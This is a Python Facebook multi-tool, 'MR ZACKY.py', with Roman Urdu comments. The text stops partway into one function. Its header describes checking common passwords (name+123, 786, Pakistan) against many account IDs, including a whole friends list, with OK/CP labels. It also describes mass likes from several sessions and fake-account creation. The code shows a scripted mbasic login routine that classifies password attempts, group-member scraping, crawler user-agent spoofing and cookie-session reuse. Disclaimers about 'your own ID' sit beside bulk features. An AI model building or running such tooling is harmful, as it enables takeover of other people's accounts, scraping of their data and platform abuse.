# MR ZACKY.py — apni Facebook friends list nikalne wala tool
# ============================================================
# Ye script tumhari APNI friends list nikalta hai — Facebook ki
# official "Download Your Information" wali file se.
# Is me koi login nahi hota, koi password try nahi hota, aur ye
# Facebook se kuch download nahi karta. Sirf tumhari apni
# download ki hui file parhi jati hai.
#
# USE KARNE KA TAREEQA (Termux ya computer):
#   1. Facebook app/website > Settings > Download your information
#      > "Friends and followers" select karo > Download karo.
#   2. Zip ko unzip karo — andar friends.json milegi.
#   3. friends.json ko is file (MR ZACKY.py) ke saath wale folder me rakho.
#   4. Chalao:  python3 "MR ZACKY.py"
#   5. Menu se [1] chunno — list ban jayegi: MR-ZACKY-friends.txt
#
# Common passwords wali list (common-passwords.txt) isi folder me hai.
# Menu se [2] chunno, ya seedha:  python3 "MR ZACKY.py" passwords 5
#
# DEMO MODE: agar friends.json / friends.html na mile to script
# demo list dikhata hai ta ke Termux me abhi test kar sako.
# Asli list ke liye apni friends.json is file ke saath rakho.
#
# USERNAME SE ID: Menu se [3] chunno — Facebook username do
# (jaise Man50or), us ka numeric Facebook ID nikal aayega aur
# MR-ZACKY-ids.txt me save ho jayega.
#
# GROUP ID: Menu se [4] chunno — Facebook group ka link do.
# Link me number ho (facebook.com/groups/1234567890) to ID foran
# nikal aayegi. Share link (facebook.com/share/g/CODE) bhi chalega —
# script us ko khol kar asli group link nikalta hai.
# Naam wale group (facebook.com/groups/python) ki ID
# bina login ke nahi nikalti — us ke link me jo number hai wohi ID hai.
#
# GROUP MEMBERS: Menu se [5] chunno — group ke Members page ki
# save ki hui file (members.html ya members.mhtml) se members ki
# list nikalta hai. List me sirf Facebook ID code hote hain
# (har line par ek number, jaise 1764564212) — naam nahi.
# Poori list bina login ke kahin se nahi nikalti —
# Facebook sirf gin ti dikhata hai. Apne browser se Members page
# save karo, file is folder me rakho, phir [5] dabao.
#
# PUBLIC CHECK: Menu se [6] chunno — members ki list me se har
# member ki profile khol kar check karta hai ke us ki ID public
# hai ya nahi. Public ho to sirf us ka Facebook ID code deta hai
# (MR-ZACKY-public-ids.txt, har line par ek number), nahi ho to
# skip kar deta hai.
#
# FRIENDS IDS: Menu se [7] chunno — kisi public Facebook ID ki
# friends list ki save ki hui file (friends.html ya friends.mhtml)
# se doston ke Facebook ID code nikalta hai
# (MR-ZACKY-friends-ids.txt, har line par ek number).
# Seedha friends page se nahi nikalta — Facebook friends list
# bina login ke nahi deta, is liye page save kar ke lao.
# LOGIN HO TO [7] seedha bhi fetch kar sakta hai (neeche LOGIN dekho).
#
# LOGIN (COOKIE SE): Menu se [8] chunno — Facebook ID se login
# karo ta ke [7] friends list seedha nikal sake. Do tareeqe:
#  (1) Cookie paste karo — browser me login hui ID ki cookie
#      (c_user=...; xs=...) yahan paste karo, session save ho jayega.
#  (2) Email + password se ek dafa login karo — script password
#      kahin save NAHI karta, sirf session cookie save karta hai.
# WARNING: fb-cookies.txt me tumhara login session hai — ye file
# kisi ko mat do aur GitHub par mat dalo. Is se tumhara Facebook
# account khul jata hai. Sirf apne phone me rakho.
# Checkpoint (code/selfie) aaye to script ruk jata hai — us ko
# browser me khud karo, phir cookie paste kar do.
#
# LIST MEIN ID DHOONDO: Menu se [9] chunno — Facebook ID code,
# profile link, email ya naam do. Script tumhari apni saved lists
# mein dhoondhega:
#   (1) my_ids.json — tumhari apni IDs wali list (ID se email).
#       Format: [{"name": "Maria Dov", "email": "man50or1+1@yandex.com",
#       "fb_id": "61596395845195", "profile_link": "https://...",
#       "status": "Active"}] — format ke liye my_ids.example.json dekho.
#       my_ids.json is folder me rakho (GitHub par mat dalo — ye
#       tumhari private list hai, sirf apne phone me rakho).
#   (2) friends.json / friends.html — doston wali list (naam ya ID se).
#   (3) MR-ZACKY-*-ids.txt / group-members.txt — sirf batayega ke
#       ye ID us file mein hai ya nahi.
# NOTE: Facebook ID se number/Gmail nahi nikalta — ye option sirf
# tumhari apni list mein dhoondhta hai. List mein na ho to
# facebook.com/login/identify par masked email/number dekho.
#
# LIKE / COMMENT: Menu se [10] chunno — post ka link do, phir Like
# ya Comment bhejo. Login chahiye ([8] se) — bina login ke nahi hota.
# Sirf ek dafa me ek action. Facebook automated like/comment ko
# block kar sakta hai — 'temporarily blocked' aaye to ruk jao.
#
# PASSWORD: my_ids.json me har entry me "password" bhi likh sakte ho
# (khud apne haath se) — [9] se dhoondhne par wo bhi dikhega.
# my_ids.json sirf apne phone me rakho — GitHub par kabhi mat dalo.
#
# PASSWORD CHECK: Menu se [11] chunno — ek ya zyada IDs ke link/code do
# (comma se alag karo, koi limit nahi), phir 3-4 password jo tumhe yaad
# hain (zyada se zyada 5). Tool har ID par tumhare password ke saath
# tumhare bataye hue aam password bhi khud try karta hai: first name +
# 123 / 1234 / 1235 / 786, 12345678, 123456789, Pakistan, 786786.
# Email list mein na ho to link/code se username ya ID number se bhi
# try karta hai — number se login na hua to email poochega. Milne par
# 'OK — <code>' likh kar password batata hai, aur aakhir me saari IDs
# ka nateeja ek saath likh deta hai. Session save NAHI hoti —
# login tum khud karo ge (cookie ya browser se). Sirf APNI ID par use
# karo. Ghalat password par Facebook account lock bhi kar sakta hai —
# andaza mat lagao. Checkpoint/lock aate hi tool khud ruk jata hai.
# [12] Password list mein likho: ID do, password likho (dobara confirm)
# — sirf phone ki file mein save hota hai, GitHub par kabhi nahi jata.
# [13] Public friends mein se apni IDs check karo: apni ID ka code/link
# do — us ki PUBLIC friends list khulti hai, list mein se sirf wohi IDs
# check hoti hain jo tum chunoge (ya jo tumhari my_ids.json mein hain).
# Baaki doston par password kabhi try nahi hota. Nateeja: milne par OK,
# checkpoint par CP likha aata hai.
# v1.8.0: [13] friends se apni IDs + OK/CP label.
# v1.9.0: [13] me session check + naam se pehchan — koi bhi dost number
# se chun kar check ho sakta hai, list mein ho ya na ho.
# v1.10.0: [13] me 'sab' — saari friends list ek saath check hoti hai.
# 'sab' sirf tab jab saari list user ki apni IDs hon (user ka kehna:
# us ki ID ki friends list mein saari IDs us ki hi hain).
# v1.11.0: [7] ab naam wali JSON list bhi banata hai (public-friends.json);
# [13] us list aur MR-ZACKY-friends-ids.txt se bhi check kar sakta hai.
# v1.15.0: [16] Facebook ID banao — Temp Mail email + OTP watch.
# Signup browser mein hota hai (FB ka form script se nahi bharta);
# tool email banata hai aur OTP khud nikal kar deta hai.
# ============================================================

import json
import os
import random
import re
import sys
import urllib.parse
import urllib.request

BASE = os.path.dirname(os.path.abspath(__file__))

GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
YELLOW = "\033[1;33m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

BANNER = r"""
███╗   ███╗██████╗     ███████╗ █████╗  ██████╗██╗  ██╗██╗   ██╗
████╗ ████║██╔══██╗    ╚══███╔╝██╔══██╗██╔════╝██║ ██╔╝╚██╗ ██╔╝
██╔████╔██║██████╔╝      ███╔╝ ███████║██║     █████╔╝  ╚████╔╝
██║╚██╔╝██║██╔══██╗     ███╔╝  ██╔══██║██║     ██╔═██╗   ╚██╔╝
██║ ╚═╝ ██║██║  ██║    ███████╗██║  ██║╚██████╗██║  ██╗   ██║
╚═╝     ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝
"""


def show_banner():
    print(GREEN + BANNER + RESET)
    print(GREEN + "=" * 64 + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "OWNER    " + RESET + ": " + WHITE + "MR ZACKY" + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "FACEBOOK " + RESET + ": " + WHITE + "MR ZACK" + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "WHATSAPP " + RESET + ": " + WHITE + "+923498124698" + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "FEATURE  " + RESET + ": " + WHITE + "My Fb ids" + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "STATUS   " + RESET + ": " + WHITE + "FREE" + RESET)
    print(GREEN + "[=] " + RESET + MAGENTA + "VERSION  " + RESET + ": " + WHITE + "1.15.0" + RESET)
    print(GREEN + "=" * 64 + RESET)


def show_menu():
    print("")
    print(CYAN + "[1] " + RESET + "Friends List Nikalo")
    print(CYAN + "[2] " + RESET + "Random Common Passwords")
    print(CYAN + "[3] " + RESET + "Username se Facebook ID Nikalo")
    print(CYAN + "[4] " + RESET + "Group ki Facebook ID Nikalo")
    print(CYAN + "[5] " + RESET + "Group ke Members ki List Nikalo")
    print(CYAN + "[6] " + RESET + "Members ki ID Public Check")
    print(CYAN + "[7] " + RESET + "Public ID ki Friends List se IDs Nikalo")
    print(CYAN + "[8] " + RESET + "Facebook Login (Cookie se)")
    print(CYAN + "[9] " + RESET + "List mein ID dhoondo (ID/link se email)")
    print(CYAN + "[10] " + RESET + "Post par Like / Comment bhejo")
    print(CYAN + "[11] " + RESET + "Password check karo (ek se zyada IDs, aam password bhi)")
    print(CYAN + "[12] " + RESET + "Password list mein likho (apni ID ka password save karo)")
    print(CYAN + "[13] " + RESET + "Public friends mein se apni IDs check karo")
    print(CYAN + "[14] " + RESET + "Post par likes bhejo (kai IDs se — 10 likes)")
    print(CYAN + "[15] " + RESET + "Post ke likes / video ke views check karo")
    print(CYAN + "[16] " + RESET + "Facebook ID banao (Temp Mail email + OTP)")
    print(CYAN + "[0] " + RESET + "Exit")
    print("")


def id_from_url(url):
    """Profile link se ID ya username nikalna."""
    if not url:
        return ""
    m = re.search(r"[?&]id=(\d+)", url)
    if m:
        return m.group(1)
    m = re.search(r"facebook\.com/([^/?#]+)", url)
    if m:
        return m.group(1)
    return ""


def load_json(path):
    """friends.json parhna (Facebook download ki format)."""
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    friends = []
    if isinstance(data, dict):
        for key in ("friends_v2", "friends"):
            if isinstance(data.get(key), list):
                friends = data[key]
                break
    elif isinstance(data, list):
        friends = data
    out = []
    for fr in friends:
        if not isinstance(fr, dict):
            continue
        name = str(fr.get("name", "")).strip()
        url = str(fr.get("url", "") or fr.get("uri", "") or fr.get("profile_link", "")).strip()
        fid = id_from_url(url) or str(fr.get("fb_id", "")).strip()
        if not name and not url and not fid:
            continue
        out.append((name, fid, url))
    return out


def load_html(path):
    """friends.html parhna (backup, agar json na mile)."""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        html = f.read()
    out = []
    seen = set()
    for url, name in re.findall(
        r'<a href="(https://www\.facebook\.com/[^"]+)"[^>]*>([^<]+)</a>', html
    ):
        fid = id_from_url(url)
        if fid and fid not in seen:
            seen.add(fid)
            out.append((name.strip(), fid, url))
    return out


def friends_list():
    print(YELLOW + "=== Friends List ===" + RESET)
    friends = []
    demo = False
    if os.path.exists(os.path.join(BASE, "friends.json")):
        friends = load_json(os.path.join(BASE, "friends.json"))
        print("friends.json se parha gaya.")
    elif os.path.exists(os.path.join(BASE, "friends.html")):
        friends = load_html(os.path.join(BASE, "friends.html"))
        print("friends.html se parha gaya.")
    else:
        # Demo data — Termux me abhi test karne ke liye.
        demo = True
        friends = [
            ("Demo Dost 1", "100000000000001", "https://www.facebook.com/profile.php?id=100000000000001"),
            ("Demo Dost 2", "demo.dost.2", "https://www.facebook.com/demo.dost.2"),
            ("Demo Dost 3", "100000000000003", "https://www.facebook.com/profile.php?id=100000000000003"),
            ("Demo Dost 4", "demo.dost.4", "https://www.facebook.com/demo.dost.4"),
            ("Demo Dost 5", "100000000000005", "https://www.facebook.com/profile.php?id=100000000000005"),
        ]
        print("friends.json nahi mili — DEMO list dikhayi ja rahi hai.")
        print("Asli list ke liye apni friends.json is file ke saath rakho.")

    out_path = os.path.join(BASE, "MR-ZACKY-friends.txt")
    with open(out_path, "w", encoding="utf-8") as f:
        for i, (name, fid, url) in enumerate(friends, 1):
            f.write("%d. %s — %s — %s\n" % (i, name, fid, url))
    print("Total friends: %d" % len(friends))
    print("List save ho gayi: %s" % out_path)
    for name, fid, url in friends[:10]:
        print(" - %s (%s)" % (name, fid))


def random_passwords(n=5):
    """common-passwords.txt se n random passwords dikhana (apni IDs ke liye)."""
    p = os.path.join(BASE, "common-passwords.txt")
    if not os.path.exists(p):
        print("common-passwords.txt nahi mili — isi folder me honi chahiye.")
        return
    with open(p, encoding="utf-8", errors="ignore") as f:
        words = [w.strip() for w in f if w.strip()]
    print("Common passwords list: %d" % len(words))
    for w in random.sample(words, min(n, len(words))):
        print(" - %s" % w)


def _lookup_via_urllib(username):
    """urllib se lookup — pehla tareeqa. Fail ho to None (curl backup hai)."""
    try:
        url = "https://lookup-id.com/"
        data = urllib.parse.urlencode({
            "fburl": "https://www.facebook.com/" + username,
            "check": "Lookup",
        }).encode("utf-8")
        req = urllib.request.Request(url, data=data, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://lookup-id.com/",
        })
        with urllib.request.urlopen(req, timeout=30) as resp:
            html = resp.read().decode("utf-8", errors="ignore")
    except Exception:
        return None
    m = re.search(r'<span id="code">(\d+)</span>', html)
    return m.group(1) if m else None


def _lookup_via_curl(username):
    """curl se lookup — backup tareeqa (Termux me curl hota hai)."""
    import shutil
    import subprocess
    if not shutil.which("curl"):
        return None
    cmd = ["curl", "-sL", "-A",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
           "-X", "POST",
           "-d", "fburl=https://www.facebook.com/" + username + "&check=Lookup",
           "https://lookup-id.com/"]
    try:
        out = subprocess.run(cmd, capture_output=True, timeout=60)
    except Exception:
        return None
    html = out.stdout.decode("utf-8", errors="ignore")
    m = re.search(r'<span id="code">(\d+)</span>', html)
    return m.group(1) if m else None


def username_to_id(username):
    """Facebook username (ya profile link) se numeric Facebook ID nikalna."""
    username = (username or "").strip()
    # Link di ho to username nikal lo: facebook.com/Man50or -> Man50or
    m = re.search(r"facebook\.com/([^/?#]+)", username)
    if m:
        username = m.group(1)
    username = username.strip("/").strip()
    if not username:
        print("Username khali hai.")
        return None
    if username.lower().startswith("profile.php"):
        print("Ye link profile.php wala hai — username wala link do, jaise facebook.com/Man50or")
        return None
    fb_id = None
    try:
        fb_id = _lookup_via_urllib(username)
    except Exception:
        fb_id = None
    if not fb_id:
        fb_id = _lookup_via_curl(username)
    if not fb_id:
        print("ID nahi mili — internet check karo aur username sahi likho (jaise Man50or).")
        print("Agar curl nahi hai to Termux me chalao: pkg install curl")
        return None
    print("Username : %s" % username)
    print("Facebook ID : %s" % fb_id)
    print("Profile  : https://www.facebook.com/profile.php?id=%s" % fb_id)
    # List me save karo — MR-ZACKY-ids.txt
    out_path = os.path.join(BASE, "MR-ZACKY-ids.txt")
    with open(out_path, "a", encoding="utf-8") as f:
        f.write("%s — %s — https://www.facebook.com/profile.php?id=%s\n" % (username, fb_id, fb_id))
    print("Save ho gayi: %s" % out_path)
    return fb_id


def _resolve_share_link(share_url):
    """Share link (facebook.com/share/g/CODE) ko follow kar ke asli group link nikalna.
    Pehle urllib, phir curl. Facebook kabhi kabhi seedha block kar deta hai —
    aise me None aata hai."""
    # urllib — redirects khud follow karta hai, final URL geturl() se milta hai.
    try:
        req = urllib.request.Request(share_url, headers={
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        })
        with urllib.request.urlopen(req, timeout=30) as resp:
            final = resp.geturl()
            if "groups/" in final:
                return final
    except Exception:
        pass
    # curl — backup tareeqa.
    import shutil
    import subprocess
    if shutil.which("curl"):
        try:
            out = subprocess.run(
                ["curl", "-sL", "-o", "/dev/null", "-w", "%{url_effective}",
                 "-A", "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                 share_url],
                capture_output=True, timeout=60)
            final = out.stdout.decode("utf-8", errors="ignore").strip()
            if "groups/" in final:
                return final
        except Exception:
            pass
    return None


def group_to_id(group_input):
    """Facebook group ke link se numeric Group ID nikalna."""
    text = (group_input or "").strip()
    if not text:
        print("Group ka link ya ID khali hai.")
        return None
    # 0) Share link ho (facebook.com/share/g/CODE) to pehle asli link nikalo.
    if "/share/g/" in text:
        print("Share link hai — asli group link khol raha hun...")
        final = _resolve_share_link(text)
        if final:
            print("Asli link: %s" % final)
            text = final
        else:
            print("Share link nahi khula — Facebook ne block kar diya.")
            print("Group kholo aur us ke upar wale link (facebook.com/groups/123456...) ko yahan do.")
            return None
    # 1) Link me number ho to wohi ID hai — facebook.com/groups/1234567890
    m = re.search(r"groups/(\d+)", text)
    if m:
        group_id = m.group(1)
        print("Group ID : %s" % group_id)
        print("Link     : https://www.facebook.com/groups/%s" % group_id)
        out_path = os.path.join(BASE, "MR-ZACKY-ids.txt")
        with open(out_path, "a", encoding="utf-8") as f:
            f.write("GROUP %s — %s — https://www.facebook.com/groups/%s\n" % (text, group_id, group_id))
        print("Save ho gayi: %s" % out_path)
        return group_id
    # 2) Sirf number likha ho to wohi ID hai.
    if text.isdigit():
        print("Group ID : %s" % text)
        print("Link     : https://www.facebook.com/groups/%s" % text)
        return text
    # 3) Naam wala group — lookup try karo (aaj kal groups par Not found aata hai).
    m = re.search(r"facebook\.com/groups/([^/?#]+)", text)
    name = m.group(1) if m else text
    print("Naam wala group hai (%s) — lookup try kar raha hun..." % name)
    fb_id = None
    try:
        fb_id = _lookup_via_urllib("groups/" + name)
    except Exception:
        fb_id = None
    if not fb_id:
        fb_id = _lookup_via_curl("groups/" + name)
    if fb_id:
        print("Group ID : %s" % fb_id)
        print("Link     : https://www.facebook.com/groups/%s" % fb_id)
        out_path = os.path.join(BASE, "MR-ZACKY-ids.txt")
        with open(out_path, "a", encoding="utf-8") as f:
            f.write("GROUP %s — %s — https://www.facebook.com/groups/%s\n" % (name, fb_id, fb_id))
        print("Save ho gayi: %s" % out_path)
        return fb_id
    print("Naam wale group ki ID bina login ke nahi nikalti.")
    print("Group kholo — us ke link me jo number hai (facebook.com/groups/123456...) wohi us ki ID hai, wo number yahan do.")
    return None


def load_members_file(path):
    """Members page ki save ki hui file (html ya mhtml) se members nikalna."""
    with open(path, "rb") as f:
        raw = f.read()
    if path.lower().endswith(".mhtml"):
        # Chrome ka save kiya hua page — quoted-printable decode karo.
        import quopri
        raw = quopri.decodestring(raw)
    html = raw.decode("utf-8", errors="ignore")
    out = []
    seen = set()
    for url, name in re.findall(
        r'<a href="(https://www\.facebook\.com/[^"]+)"[^>]*>([^<]+)</a>', html
    ):
        # Sirf profile wale links lo — group ke andar ke tabs nahi.
        if "/groups/" in url or "facebook.com/groups" in url:
            continue
        fid = id_from_url(url)
        if fid and fid not in seen:
            seen.add(fid)
            out.append((name.strip(), fid, url))
    return out


def group_members():
    print(YELLOW + "=== Group ke Members ===" + RESET)
    members = []
    found = None
    for fname in ("members.html", "members.mhtml", "group-members.html"):
        p = os.path.join(BASE, fname)
        if os.path.exists(p):
            found = fname
            members = load_members_file(p)
            print("%s se parha gaya." % fname)
            break
    if not found:
        print("members.html nahi mili — is liye list nahi ban saki.")
        print("")
        print("Tareeqa:")
        print("1. Browser me group kholo, upar Members tab par jao.")
        print("2. Page ko save karo (Chrome: menu > Download / Save page).")
        print("3. File ka naam members.html rakho aur is folder me daalo.")
        print("4. Phir [5] dabao — list ban jayegi: MR-ZACKY-group-members.txt")
        print("")
        print("Note: poori list (jaise 867K members) bina login ke kahin se")
        print("nahi nikalti — Facebook sirf gin ti dikhata hai. Jo members")
        print("page par load honge, un ki list banegi.")
        return
    out_path = os.path.join(BASE, "MR-ZACKY-group-members.txt")
    with open(out_path, "w", encoding="utf-8") as f:
        for name, fid, url in members:
            # List me sirf ID code — naam nahi.
            if fid.isdigit():
                f.write("%s\n" % fid)
            else:
                fb_id = _lookup_via_urllib(fid) or _lookup_via_curl(fid)
                if fb_id:
                    f.write("%s\n" % fb_id)
    print("Total members mile: %d" % len(members))
    print("List save ho gayi: %s" % out_path)
    print("List me sirf ID code hain (naam nahi).")


CRAWLER_UA = "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"


def _fetch_profile_html(url):
    """Profile page fetch karo — crawler user-agent se (public profile ka data milta hai).
    Pehle urllib, phir curl."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": CRAWLER_UA})
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.read().decode("utf-8", errors="ignore")
    except Exception:
        pass
    import shutil
    import subprocess
    if shutil.which("curl"):
        try:
            out = subprocess.run(
                ["curl", "-sL", "-A", CRAWLER_UA, url],
                capture_output=True, timeout=60)
            return out.stdout.decode("utf-8", errors="ignore")
        except Exception:
            pass
    return None


def check_profile_public(url):
    """Profile public hai ya nahi: 'public' / 'locked' / 'unknown'."""
    html = _fetch_profile_html(url)
    if not html:
        return "unknown"
    m = re.search(r'og:title" content="([^"]*)"', html)
    title = m.group(1).strip() if m else ""
    if not title or title.lower().startswith("log in"):
        return "unknown"
    if "PrivacyLocked" in html:
        return "locked"
    if "PrivacyUnlocked" in html:
        return "public"
    # Icon na mile to bhi naam dikh raha hai — public mana jayega.
    return "public"


# Facebook login (cookie se) — fb-cookies.txt me session save hota hai.
# WARNING: fb-cookies.txt me tumhara login session hai — ye file kisi
# ko mat do aur GitHub par mat dalo. Is se tumhara Facebook account
# khul jata hai. Sirf apne phone me rakho.

MOBILE_UA = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
COOKIE_FILE = "fb-cookies.txt"


def load_cookies():
    p = os.path.join(BASE, COOKIE_FILE)
    if not os.path.exists(p):
        return ""
    with open(p, encoding="utf-8", errors="ignore") as f:
        return f.read().strip()


def save_cookies(cookie_str):
    p = os.path.join(BASE, COOKIE_FILE)
    with open(p, "w", encoding="utf-8") as f:
        f.write(cookie_str.strip())
    try:
        os.chmod(p, 0o600)
    except Exception:
        pass
    print("Session save ho gayi: %s" % p)
    print("WARNING: ye file tumhara login session hai — kisi ko mat do.")


def parse_netscape_cookies(text):
    """cookies.txt (Netscape format) se facebook.com wale cookies nikalna."""
    pairs = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and "facebook" in parts[0]:
            pairs.append("%s=%s" % (parts[5], parts[6]))
    return "; ".join(pairs)


def fb_fetch_full(url):
    """Cookie ke saath page fetch karo — (html, final_url) ya (None, None)."""
    return fb_fetch_full_cookie(load_cookies(), url)


def fb_fetch_full_cookie(cookie, url):
    """Kisi ek cookie se page fetch karo — (html, final_url) ya (None, None).
    Kai IDs se like bhejne ke liye chahiye (har session ki apni cookie)."""
    if not cookie:
        return None, None
    headers = {"User-Agent": MOBILE_UA, "Cookie": cookie}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.read().decode("utf-8", errors="ignore"), resp.geturl()
    except Exception:
        pass
    import shutil
    import subprocess
    if shutil.which("curl"):
        try:
            out = subprocess.run(
                ["curl", "-sL", "-A", MOBILE_UA, "-H", "Cookie: " + cookie,
                 "-w", "\n%{url_effective}", url],
                capture_output=True, timeout=60)
            text = out.stdout.decode("utf-8", errors="ignore")
            if "\n" in text:
                body, final = text.rsplit("\n", 1)
                return body, final.strip()
            return text, url
        except Exception:
            pass
    return None, None


def fb_fetch(url):
    """Saved cookie ke saath Facebook page fetch karo (urllib, phir curl)."""
    html, _ = fb_fetch_full(url)
    return html


def fb_whoami():
    """Session check — (naam, profile_link) ya (None, None).
    /me kholo to logged-in ID ki profile khulti hai — us ke title
    me us ka naam hota hai (jaise 'MANSOOR ALI | Facebook')."""
    return fb_whoami_cookie(load_cookies())


def fb_whoami_cookie(cookie):
    """Kisi ek cookie se session check — (naam, profile_link) ya (None, None)."""
    html, final_url = fb_fetch_full_cookie(cookie, "https://mbasic.facebook.com/me")
    if not html:
        return None, None
    if "login.php" in html and "Log in" in html:
        return None, None
    name = ""
    m = re.search(r"<title>(?:\(\d+\)\s*)?([^|<]+)", html)
    if m:
        name = m.group(1).strip()
    if not name or name.lower() in ("facebook", "log in", "login"):
        m = re.search(r'og:title" content="([^"]*)"', html)
        if m:
            name = m.group(1).strip()
    if not name or name.lower() in ("facebook", "log in", "login"):
        return None, None
    return name, final_url

def _mbasic_login_attempt(email, password):
    """Ek login koshish — (status, cookie) deti hai, kuch print nahi karti.
    status: 'ok' | 'wrong' | 'checkpoint' | 'locked' | 'error' | 'no_account'"""
    import http.cookiejar
    import urllib.error
    import urllib.parse
    login_url = "https://mbasic.facebook.com/login.php"
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        req = urllib.request.Request(login_url, headers={"User-Agent": MOBILE_UA})
        with opener.open(req, timeout=30) as resp:
            html = resp.read().decode("utf-8", errors="ignore")
    except Exception:
        return "error", None
    m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>', html)
    action = m.group(1) if m else "/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
    if action.startswith("/"):
        action = "https://mbasic.facebook.com" + action
    elif action.startswith("http"):
        pass
    else:
        action = "https://mbasic.facebook.com/" + action
    fields = {}
    for name, value in re.findall(
        r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html
    ):
        fields[name] = value
    email_field = "email"
    pass_field = "pass"
    for name in re.findall(r'<input[^>]*name="([^"]+)"', html):
        if name.lower() in ("email", "m_login_email"):
            email_field = name
        if name.lower() == "pass":
            pass_field = name
    fields[email_field] = email
    fields[pass_field] = password
    data = urllib.parse.urlencode(fields).encode("utf-8")
    try:
        req = urllib.request.Request(action, data=data, headers={
            "User-Agent": MOBILE_UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": login_url,
        })
        with opener.open(req, timeout=30) as resp:
            resp_html = resp.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        try:
            resp_html = e.read().decode("utf-8", errors="ignore")
        except Exception:
            resp_html = ""
    except Exception:
        return "error", None
    low = resp_html.lower()
    if "checkpoint" in low or "two-factor" in low or "login approval" in low or "confirm your identity" in low:
        return "checkpoint", None
    if "temporarily" in low and ("lock" in low or "blocked" in low):
        return "locked", None
    if "isn't connected to an account" in low or "not connected to an account" in low or "doesn't match any account" in low:
        return "no_account", None
    pairs = []
    for c in jar:
        if "facebook" in c.domain:
            pairs.append("%s=%s" % (c.name, c.value))
    cookie = "; ".join(pairs)
    if "c_user=" not in cookie:
        return "wrong", None
    return "ok", cookie


def _mbasic_login(email, password):
    """mbasic se login — form parho, POST karo, cookies nikalo.
    Checkpoint/2FA aaye to ruk jao (None) — us ko browser se karo."""
    status, cookie = _mbasic_login_attempt(email, password)
    if status == "ok":
        return cookie
    if status == "checkpoint":
        print("Facebook ne CHECKPOINT manga hai (code/selfie).")
        print("Script yahin ruk raha hai — checkpoint browser me khud karo,")
        print("phir [8] option 1 se cookie paste kar do.")
        return None
    if status == "locked":
        print("Facebook ne account ko temporarily lock kar diya — kuch der ruk kar dobara try karo.")
        return None
    if status == "error":
        print("Login request fail — internet check kar ke dobara try karo.")
        return None
    if status == "no_account":
        print("Is email/username se koi account nahi mila — email ya username check karo.")
        return None
    print("Login nahi hua — email/password galat ho sakta hai, ya Facebook ne rok diya.")
    print("Browser se login kar ke [8] option 1 se cookie paste karo.")
    return None


def fb_login_password():
    import getpass
    email = input("Facebook email/phone do: ").strip()
    password = getpass.getpass("Password do (screen par nahi dikhega): ")
    if not email or not password:
        print("Email/password khali hai.")
        return
    print("Login kar raha hun... (password kahin save nahi hota)")
    cookie = _mbasic_login(email, password)
    if cookie:
        save_cookies(cookie)
        name, link = fb_whoami()
        if name:
            print("Login ho gaya!")
            print("ID ka naam: %s" % name)
            print("Profile: %s" % link)
            print("Is time ye ID logged in hai.")
        else:
            print("Cookie mili par session check nahi hua — dobara [8] se check karo.")


def fb_login():
    print(YELLOW + "=== Facebook Login (Cookie se) ===" + RESET)
    if load_cookies():
        name, link = fb_whoami()
        if name:
            print("Pehle se login hai: %s (%s)" % (name, link))
        else:
            print("Cookie save hai par session check nahi hua (expire ho sakti hai).")
    print("1. Cookie paste karo (browser se li hui)")
    print("2. Email + password se login karo (ek dafa, phir cookie save)")
    print("0. Wapas")
    choice = input("Option chunno: ").strip()
    if choice == "1":
        print("Browser me Facebook kholo (jis ID se login hai), us ki cookie")
        print("copy karo aur yahan paste karo. (c_user=...; xs=...; sb=... jaisi line)")
        raw = input("Cookie paste karo: ").strip()
        if not raw:
            print("Cookie khali hai.")
            return
        cookie = parse_netscape_cookies(raw) if ("\t" in raw and "facebook" in raw) else raw
        if "c_user" not in cookie:
            print("Cookie me c_user nahi mila — poori cookie line paste karo.")
            return
        save_cookies(cookie)
        name, link = fb_whoami()
        if name:
            print("Login ho gaya!")
            print("ID ka naam: %s" % name)
            print("Profile: %s" % link)
            print("Is time ye ID logged in hai.")
        else:
            print("Cookie save ho gayi par session check nahi hua — cookie galat ya expire ho sakti hai.")
    elif choice == "2":
        fb_login_password()
    elif choice == "0":
        return
    else:
        print("Ghalat option.")


def check_members_public():
    print(YELLOW + "=== Members ki ID Public Check ===" + RESET)
    members = []
    txt_path = os.path.join(BASE, "MR-ZACKY-group-members.txt")
    if os.path.exists(txt_path):
